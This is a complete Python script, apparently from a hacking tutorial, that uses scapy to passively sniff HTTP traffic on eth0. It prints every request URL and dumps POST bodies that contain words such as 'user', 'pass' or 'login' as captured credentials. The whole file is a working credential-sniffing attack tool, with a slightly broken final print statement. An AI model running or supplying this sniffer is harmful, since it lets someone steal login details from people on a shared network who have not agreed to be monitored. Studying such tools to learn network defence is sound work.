#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    #store=False -> Not to store packets in memory, prn -> callback function[Called everytime a packet is captured]

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    # The combination of host and path fields in HTTP layer forms complete URL

def getcreds(packet):
    if packet.haslayer(scapy.Raw):
        # Raw layer contains POST based creds
        load = packet[scapy.Raw].load
        # Load field contains filtered out info
        possiblelist = ["user", "username", "pass", "password", "login", "creds", "credentials"]
        # A list of possible values contained in load field as set by programmer
        for i in possiblelist:
            if i in load:
                return load

def process_sniffed_packet(packet):
    #callback function
    if packet.haslayer(http.HTTPRequest):
        # install scapy_http
        # scapy doesn`t come with http filter
        #print(packet.show())
        url =get_url(packet)
        print("[+] HTTP Request: " + url)
        login_info = getcreds(packet)
        if login_info:
            print(
                "\n ------------------------------------------------------------ \n [+] Credentials: " + login_info) + "\n ------------------------------------------------------------ \n"


sniff("eth0")
